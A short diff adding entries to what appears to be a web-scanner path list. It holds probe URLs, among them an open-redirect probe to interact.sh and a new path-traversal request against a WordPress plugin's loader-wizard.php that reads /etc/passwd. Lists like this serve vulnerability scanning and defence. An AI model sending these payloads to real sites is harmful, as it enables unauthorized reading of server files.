@@ -2139,3 +2139,5 @@
 /?user-logout=true&redirect_to_on_logout=https://interact.sh
 /api/v1/nvidia-nim/get-token
 /reset-password/?selector=test
+/wp-content/plugins/ioncube-tester-plus/readme.txt
+/wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
